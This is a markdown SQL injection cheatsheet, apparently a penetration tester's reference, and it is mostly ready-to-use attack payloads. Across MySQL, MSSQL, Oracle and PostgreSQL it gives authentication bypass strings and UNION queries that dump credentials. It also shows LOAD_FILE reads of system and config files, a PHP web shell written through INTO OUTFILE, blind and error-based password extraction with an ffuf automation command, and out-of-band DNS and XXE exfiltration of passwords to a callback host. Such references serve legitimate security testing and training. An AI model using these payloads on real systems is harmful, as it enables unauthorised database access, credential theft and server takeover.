# SQL Injection Cheatsheet

A structured reference for SQL injection techniques, payloads, and enumeration strategies.

**References:**
- [PayloadsAllTheThings – SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## Table of Contents

- [Methodology](#methodology)
- [MySQL Operator Precedence](#mysql-operator-precedence)
- [Comment Syntax](#comment-syntax)
- [Authentication Bypass](#authentication-bypass)
- [Union-Based Injection](#union-based-injection)
  - [Column Enumeration](#column-enumeration)
  - [Data Extraction](#data-extraction)
  - [Multi-Value Retrieval](#multi-value-retrieval)
- [Database Enumeration](#database-enumeration)
  - [Version Fingerprinting](#version-fingerprinting)
  - [Schema & Table Discovery](#schema--table-discovery)
  - [Oracle-Specific Enumeration](#oracle-specific-enumeration)
  - [Privilege Enumeration](#privilege-enumeration)
- [File Read / Write](#file-read--write)
  - [Prerequisites](#prerequisites)
  - [Reading Files](#reading-files)
  - [Writing Files](#writing-files)
  - [Writing a Web Shell](#writing-a-web-shell)
- [Blind SQL Injection](#blind-sql-injection)
  - [Boolean-Based Blind](#boolean-based-blind)
  - [Time-Based Blind](#time-based-blind)
- [Error-Based Extraction](#error-based-extraction)
- [Out-of-Band (OOB) Injection](#out-of-band-oob-injection)
  - [DNS Exfiltration — MSSQL](#dns-exfiltration--mssql)
  - [DNS Exfiltration — Oracle (XXE)](#dns-exfiltration--oracle-xxe)
  - [Exfiltrating Data via OOB](#exfiltrating-data-via-oob)

---

## Methodology

A repeatable process for finding and exploiting SQLi.

### Steps for a SQLi PoC

1. **Identify injectable points** — Find input fields or URL parameters that interact with the database.
2. **Inject SQL syntax** — Add characters like `'`, `"`, `OR 1=1`, `--`, etc. and observe if the application responds unexpectedly.
3. **Observe responses** — Errors, different output, or delays all indicate potential vulnerability.
4. **Determine the query structure** — Think about what the back-end query is doing (login check? search? display row?).
5. **Enumerate** — Use the workflow: **version → current DB → databases → tables → columns → data**.

### Recon Tips

- Look at the URL and its parameters — they may hint at the query structure.
- Read the page content carefully; it may reveal column names or data types.
- Try poking with `'` first. If it breaks, try `'--` to see if commenting restores it.
- Use `ORDER BY` to count columns before attempting `UNION`.
- Some characters or operators may be **filtered** by the application or WAF. If `-- ` causes an error but `#` works, the backend is MySQL and the comment style matters. Adjust accordingly.
- Try to understand what **DBMS is in use** before sending payloads — syntax differs across MySQL, MSSQL, Oracle, and PostgreSQL.

### Quick Reference

| Goal | Payload Example |
|------|----------------|
| Test for vulnerability | `'` |
| Confirm injectable | `' OR 1=1-- -` |
| Count columns | `' ORDER BY 1-- -` (increment until error) |
| Find output columns | `' UNION SELECT NULL,NULL,NULL-- -` |
| Get DB version | `' UNION SELECT @@version,NULL-- -` |
| Get current DB | `' UNION SELECT database(),NULL-- -` |
| List all DBs | `' UNION SELECT schema_name,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- -` |
| List tables | `' UNION SELECT TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='x'-- -` |
| List columns | `' UNION SELECT COLUMN_NAME,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='x'-- -` |
| Dump data | `' UNION SELECT col1,col2 FROM db.table-- -` |

---

## MySQL Operator Precedence

Useful when crafting or reasoning about complex injection payloads.

| Priority | Operators |
|----------|-----------|
| 1 (highest) | `/` `*` `%` |
| 2 | `+` `-` |
| 3 | `=` `>` `<` `<=` `>=` `!=` `LIKE` |
| 4 | `NOT` (`!`) |
| 5 | `AND` (`&&`) |
| 6 (lowest) | `OR` (`\|\|`) |

---

## Comment Syntax

Comments truncate the remainder of the original query after your injection.

| Database | Syntax |
|----------|--------|
| MySQL | `-- -` &nbsp; `#` &nbsp; `/*comment*/` |
| MSSQL / Oracle | `--` |
| PostgreSQL | `--` &nbsp; `/*comment*/` |

> **Note:** MySQL requires a space after `--`. The `-- -` form (dash dash space dash) is common in payloads to ensure the space survives URL encoding. The `#` shorthand works only in MySQL.

---

## Authentication Bypass

These payloads manipulate `WHERE` clauses to always evaluate as true.

| Payload | Technique |
|---------|-----------|
| `' OR 1=1-- -` | Always-true condition |
| `' OR '1'='1` | String comparison bypass |
| `admin'-- -` | Comment out password check entirely |
| `admin')-- -` | Bypass with closing parenthesis + comment |
| `administrator'-- -` | Eliminates `AND password = '...'` clause |
| `administrator' OR 1=1-- -` | Combined username guess + always-true |

> **How it works:** A vulnerable query like `SELECT * FROM users WHERE username='INPUT' AND password='...'` becomes trivially bypassable when the `AND password` clause is commented out or overridden with an always-true condition.

---

## Union-Based Injection

`UNION` injection appends a second `SELECT` to the original query, piggybacking attacker-controlled data into the application's response.

**Requirements:**
- The injected `SELECT` must return the **same number of columns** as the original.
- Column data types must be **compatible** (use `NULL` when unsure — it is compatible with any type).

### Column Enumeration

**Method 1 — ORDER BY (increment until error):**
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   -- error here → 2 columns
```

**Method 2 — UNION NULL (add NULLs until no error):**
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

**Method 3 — UNION with integers (visible in response):**
```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3,4-- -
```
Numbers visible in the response identify which column positions are rendered — those are your output columns.

### Data Extraction

Once the column count is known, find which column accepts strings, then pull data.

**Identify a string-compatible column:**
```sql
' UNION SELECT NULL,'test_string',NULL-- -
```

**Common extraction payloads:**

| Payload | Data Retrieved |
|---------|----------------|
| `' UNION SELECT 1,@@version,3,4-- -` | Database version |
| `' UNION SELECT 1,database(),2,3-- -` | Current database name |
| `' UNION SELECT 1,user(),3,4-- -` | Current DB user |
| `' UNION SELECT 1,POW(1,1),3,4-- -` | Numeric blind verification |
| `' UNION SELECT username,password FROM users-- -` | Credentials from users table |
| `' UNION SELECT username,2,3,4 FROM passwords-- -` | Passwords table dump |
| `' UNION SELECT 1,username,password,4 FROM dev.credentials-- -` | Cross-database dump |

### Multi-Value Retrieval

When only one output column is available, concatenate multiple fields with a separator.

| Database | Concatenation Syntax |
|----------|----------------------|
| **MySQL / MariaDB** | `CONCAT(col1, '~', col2)` or `col1 \|\| '~' \|\| col2` |
| **Oracle** | `col1 \|\| '~' \|\| col2` |
| **MSSQL** | `col1 + '~' + col2` |
| **PostgreSQL** | `col1 \|\| '~' \|\| col2` |

**Example (Oracle/PostgreSQL):**
```sql
' UNION SELECT username || '~' || password FROM users-- -
```

**Output will look like:**
```
administrator~s3cure
wiener~peter
carlos~montoya
```

---

## Database Enumeration

`INFORMATION_SCHEMA` is a metadata database present in MySQL, MSSQL, and PostgreSQL (not Oracle). It contains information about every database, table, and column on the server.

**Enumeration flow:** databases → tables → columns → data

### Version Fingerprinting

Identify the DBMS type and version first — syntax varies significantly between them.

| Database | Query |
|----------|-------|
| MySQL / MSSQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

**In-band example:**
```sql
' UNION SELECT @@version-- -
' UNION SELECT NULL, banner FROM v$version-- -   -- Oracle
```

**Blind detection (time-based):**
```sql
SELECT SLEEP(5);        -- MySQL
SELECT pg_sleep(5);     -- PostgreSQL
WAITFOR DELAY '0:0:5';  -- MSSQL
```

### Schema & Table Discovery

**List all databases:**
```sql
' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

**List tables in a specific database (e.g., `dev`):**
```sql
' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4
FROM INFORMATION_SCHEMA.TABLES
WHERE table_schema='dev'-- -
```
`TABLE_NAME` holds the table name; `TABLE_SCHEMA` shows which database it belongs to.

**List columns in a specific table (e.g., `credentials`):**
```sql
' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA
FROM INFORMATION_SCHEMA.COLUMNS
WHERE table_name='credentials'-- -
```

**Dump data from a known table:**
```sql
' UNION SELECT 1,username,password,4 FROM dev.credentials-- -
```

### Oracle-Specific Enumeration

Oracle does not have `INFORMATION_SCHEMA`. Use these alternatives:

**List all tables:**
```sql
SELECT * FROM all_tables
```

**List columns in a table:**
```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

> **Note:** Oracle also requires every `SELECT` to have a `FROM` clause. Use `FROM dual` as a dummy table when you don't need real data: `' UNION SELECT NULL FROM dual-- -`

### Privilege Enumeration

Determine the current user's permissions — relevant before attempting file read/write.

| Payload | Information Retrieved |
|---------|----------------------|
| `SELECT USER()` | Current DB user (function form) |
| `SELECT CURRENT_USER()` | Current DB user (alias) |
| `SELECT user FROM mysql.user` | All users in MySQL |
| `' UNION SELECT 1,user(),3,4-- -` | Current user via UNION |
| `' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user="root"-- -` | Checks `SUPER` privilege |
| `' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges-- -` | All privileges, all users |
| `' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Privileges for specific user |
| `' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -` | File I/O directory restriction |

---

## File Read / Write

### Prerequisites

Three conditions must all be true before file operations will work:

1. The DB user has the **`FILE` privilege**.
2. MySQL's `secure_file_priv` global variable is **not set to NULL**.
3. The OS user running MySQL has **read/write access** to the target path.

**Checking `secure_file_priv`:**
```sql
SELECT variable_name, variable_value
FROM information_schema.global_variables
WHERE variable_name = "secure_file_priv";
```

| Value | Meaning |
|-------|---------|
| `''` (empty) | Can read/write from **any directory** |
| `/some/path/` | Restricted to that directory only |
| `NULL` | File read/write is **disabled** |

### Reading Files

Use `LOAD_FILE()` — requires `FILE` privilege.

```sql
SELECT LOAD_FILE('/etc/passwd');

' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3,4-- -
```

**Useful targets:**

| Path | Contents |
|------|----------|
| `/etc/passwd` | System users |
| `/etc/hosts` | Host mappings |
| `/var/www/html/index.php` | Web app source code (may reveal DB creds) |
| `/var/www/html/config.php` | DB connection config |
| `/etc/apache2/apache2.conf` | Apache web root config |
| `/etc/nginx/nginx.conf` | Nginx config |

> **Tip:** Reading web app source files via `LOAD_FILE` can expose database credentials, other injectable parameters, or internal logic — worth doing before jumping straight to a shell.

### Writing Files

Use `SELECT INTO OUTFILE`.

**Test write access first:**
```sql
SELECT 'file written successfully!' INTO OUTFILE '/tmp/test.txt';

' UNION SELECT 1,'write test',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

**Find the web root** if you don't know it — check server configs via `LOAD_FILE`:
- Apache: `/etc/apache2/apache2.conf`
- Nginx: `/etc/nginx/nginx.conf`
- IIS: `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`

> **Warning:** `INTO OUTFILE` will fail if the file already exists, or if the MySQL process user lacks write permission on the target directory.

### Writing a Web Shell

**Minimal PHP web shell:**
```php
<?php system($_REQUEST[0]); ?>
```

**Write it via UNION injection:**
```sql
' UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -
```

**Execute commands:**
```
http://TARGET/shell.php?0=id
http://TARGET/shell.php?0=whoami
http://TARGET/shell.php?0=cat+/etc/passwd
```

---

## Blind SQL Injection

Blind SQLi occurs when the application is vulnerable but **does not return query results or errors** in the response. Exploitation relies on crafting queries whose true/false outcome or execution time reveals information indirectly.

### Boolean-Based Blind

The application returns a different response (different content, length, or status) depending on whether the injected condition is true or false. Exploit by asking binary yes/no questions.

**Step 1 — Confirm vulnerability:**
```sql
' AND 1=1--    -- true  → normal response
' AND 1=2--    -- false → different/empty response
```

**Step 2 — Confirm a target table exists:**
```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a'--

#or

' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0-- -
```

**Step 3 — Confirm a specific row exists:**
```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
```

**Step 4 — Determine password length:**
```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)<25)='a'--
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a'--
```

**Step 5 — Extract password character by character:**
```sql
-- Binary search: is char 1 of password > 'm'?
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'm'--
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 't'--
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) = 's'--
```

**Fuzz template** (use with Burp Intruder or ffuf, replace `POS` and `CHAR`):
```sql
' AND (SELECT SUBSTRING(password,POS,1) FROM users WHERE username='administrator')='CHAR'--
```

---

#### Oracle Boolean-Based Blind

Oracle doesn't support stacked queries the same way. Use string concatenation with `||` to inject into cookie/parameter values, and trigger errors conditionally using `CASE WHEN ... THEN TO_CHAR(1/0)`.

**Confirm injection point (Oracle):**
```sql
'||(SELECT '' FROM dual)||'           -- valid Oracle syntax, neutral result
'||(SELECT '' FROM users WHERE ROWNUM=1)||'   -- confirms users table exists
```

**CASE WHEN error trigger — confirm condition:**
```sql
-- False condition: no error
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

-- True condition: triggers divide-by-zero error → different response
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

**Enumerate tables (Oracle):**
```sql
-- Does a table starting with 'u' exist?
'||(SELECT CASE WHEN SUBSTR(table_name,1,1)='u' THEN TO_CHAR(1/0) ELSE '' END FROM (SELECT table_name FROM all_tables WHERE ROWNUM=1))||'
```

**Enumerate columns (Oracle):**
```sql
-- Does a column named 'PASSWORD' exist in USERS?
'||(SELECT CASE WHEN (SELECT 'x' FROM all_tab_columns WHERE table_name='USERS' AND column_name='PASSWORD')='x' THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

**Confirm row exists in users (Oracle):**
```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Extract password character by character (Oracle):**
```sql
-- Password length check
'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

-- Character extraction
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

---

#### MSSQL/PostgreSQL Boolean-Based Blind (CASE WHEN)

An alternative to `IF` — use `CASE WHEN` to trigger a divide-by-zero on a true condition:

```sql
-- False → returns 'a', no error
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'--

-- True → divide-by-zero error → different response
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--

-- Extract data with CASE WHEN (MSSQL)
' AND (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)>'m') THEN 1/0 ELSE 'a' END FROM users)='a'--
```

> **Tip:** Boolean blind is slow manually. Use tools like `sqlmap` or write a script to binary-search through character sets.

---

### Time-Based Blind

No visible difference in the response — a time delay in the response confirms a true condition.

| Database | Time Delay Payload |
|----------|--------------------|
| MySQL | `SLEEP(5)` |
| PostgreSQL | `pg_sleep(5)` |
| MSSQL | `WAITFOR DELAY '0:0:5'` |
| Oracle | `dbms_pipe.receive_message(('a'),5)` |

**Confirm vulnerability:**
```sql
' AND SLEEP(5)--                        -- MySQL
'; IF (1=1) WAITFOR DELAY '0:0:10'--   -- MSSQL (true → delay)
'; IF (1=2) WAITFOR DELAY '0:0:10'--   -- MSSQL (false → no delay)
```

**PostgreSQL — conditional delay using CASE:**
```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

**Confirm user exists (PostgreSQL):**
```sql
'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

**Check password length (PostgreSQL):**
```sql
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

**Extract password character by character (PostgreSQL):**
```sql
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

**Extract password character by character (MSSQL):**
```sql
'; IF (SELECT COUNT(username) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)>'m') = 1 WAITFOR DELAY '0:0:5'--
```

**Automate with ffuf** (fuzz position + character simultaneously):
```bash
ffuf -w alphanum-case.txt:FUZZ1 -w numbers.txt:FUZZ2 \
  -u 'https://TARGET/page' \
  -H "Cookie: session=SESSIONTOKEN; trackingid=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,FUZZ2,1)='FUZZ1')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--" \
  -mt '>5000'
```
`FUZZ1` = character wordlist (a–z, 0–9), `FUZZ2` = position (1, 2, 3, ...). Match on responses taking >5000ms.

> **Note:** Time-based blind is the most reliable technique when there is zero output — but it is slow and sensitive to network jitter. Automate with `sqlmap --technique=T` where possible.

---

## Error-Based Extraction

Error-based extraction tricks the database into embedding query results inside its own error messages, which the application then reflects back to the user. It requires the application to display verbose DB errors.

**Core technique — `CAST` type mismatch:**

Force the DB to cast a string result as an integer. The error message will contain the actual value.

```sql
CAST((SELECT example_column FROM example_table) AS int)
-- ERROR: invalid input syntax for type integer: "Example data"
```

**Extract username:**
```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-- ERROR: invalid input syntax for type integer: "administrator"
```

**Extract password:**
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
-- ERROR: invalid input syntax for type integer: "s3cr3tpassword123"
```

**Target a specific user:**
```sql
' AND 1=CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int)--
```

> **Note:** `LIMIT 1` is important — if the subquery returns more than one row, the CAST error won't trigger cleanly. Always limit to a single row.

> **Applicability:** Primarily PostgreSQL and MSSQL. MySQL errors are less verbose by default.

---

## Out-of-Band (OOB) Injection

OOB injection is used when the application gives **no visible output and no timing difference** — both in-band and blind techniques are blocked. Instead, the database is made to initiate an **outbound network request** (DNS or HTTP) to an attacker-controlled server, carrying the exfiltrated data in the request itself.

**Requirements:**
- The DB server must be able to make outbound network connections.
- You need a callback server — [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) is the standard tool for this.

---

### DNS Exfiltration — MSSQL

MSSQL's `xp_dirtree` (and related stored procedures) can be abused to trigger a UNC path lookup, which results in a DNS query to an attacker-controlled domain.

**Confirm OOB channel works:**
```sql
'; EXEC master..xp_dirtree '//YOUR.BURP-COLLABORATOR.net/a'--
```
If the DNS lookup arrives at your collaborator, the channel is live.

**Generic MSSQL OOB functions:**

| Function | Payload |
|----------|---------|
| `xp_dirtree` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree ''\\'+@T+'.YOUR.DOMAIN\x''');` |
| `xp_fileexist` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist ''\\'+@T+'.YOUR.DOMAIN\x''');` |
| `xp_subdirs` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs ''\\'+@T+'.YOUR.DOMAIN\x''');` |
| `sys.dm_os_file_exists` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');` |
| `fn_trace_gettable` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);` |
| `fn_get_audit_file` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);` |

---

### DNS Exfiltration — Oracle (XXE)

Oracle supports XML processing functions. `EXTRACTVALUE` with a crafted `xmltype` can trigger an external entity (XXE) resolution, causing a DNS/HTTP request to an attacker-controlled server.

**Confirm OOB channel (Oracle):**
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR.BURP-COLLABORATOR.net/"> %remote;]>'),'/l') FROM dual--
```

URL-encoded form (for use in HTTP parameters):
```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR.BURP-COLLABORATOR.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```

---

### Exfiltrating Data via OOB

Once the OOB channel is confirmed, embed query results directly in the DNS subdomain of the callback URL. The data appears in the DNS lookup logged by your collaborator.

**MSSQL — exfiltrate password:**
```sql
'; DECLARE @p VARCHAR(1024);
SET @p=(SELECT password FROM users WHERE username='administrator');
EXEC('master..xp_dirtree "//'+@p+'.YOUR.BURP-COLLABORATOR.net/a"')--
```
The collaborator will receive a DNS lookup like: `s3cr3tpassword.YOUR.BURP-COLLABORATOR.net`

**Oracle — exfiltrate password via XXE:**
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR.BURP-COLLABORATOR.net/"> %remote;]>'),'/l') FROM dual--
```

URL-encoded form:
```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR.BURP-COLLABORATOR.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```

> **Note:** The exfiltrated value becomes a DNS subdomain label, so it must be alphanumeric. Hashed or hex-encoded passwords work cleanly; values with special characters may need encoding first.
